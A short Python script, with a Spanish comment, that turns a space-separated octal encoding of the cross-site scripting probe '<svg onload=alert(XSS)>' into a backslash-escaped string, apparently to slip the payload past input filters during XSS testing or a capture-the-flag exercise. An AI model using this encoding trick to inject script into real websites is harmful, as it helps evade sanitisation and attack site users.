
raw= "74 163 166 147 40 157 156 154 157 141 144 75 141 154 145 162 164 50 47 130 123 123 47 51 76"
#Esto es notacion octal, se corresponde con: <svg onload=alert(XSS)>

final="\\"

for c in raw:
    if c==" ":
        c = "\\"
    final+=c

print(final)
